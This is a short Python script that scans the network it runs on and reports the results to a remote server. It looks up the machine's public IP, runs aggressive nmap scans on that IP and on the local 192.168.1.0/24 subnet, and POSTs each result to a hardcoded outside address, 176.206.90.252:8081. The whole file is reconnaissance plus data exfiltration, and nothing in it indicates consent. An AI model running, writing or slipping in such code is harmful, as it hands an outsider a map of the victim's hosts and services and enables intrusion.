import socket
import requests
import json
import datetime
import os

x = datetime.datetime.now()

url = 'http://176.206.90.252:8081/?title='

public_ip = json.loads(requests.get("https://ip.seeip.org/jsonip?").text)["ip"]
requests.post(url + 'public_ip-' + x.strftime("%H-%M-%d-%m-%Y"), public_ip)
print (public_ip)

stream = os.popen('nmap -A ' + public_ip)
scan_public = stream.read()
requests.post(url + 'scan_public-' + x.strftime("%H-%M-%d-%m-%Y"), scan_public)
print(scan_public)

stream = os.popen('nmap -A 192.168.1.0/24')
scan_local = stream.read()
requests.post(url + 'scan_local-' + x.strftime("%H-%M-%d-%m-%Y"), scan_local)
print(scan_local)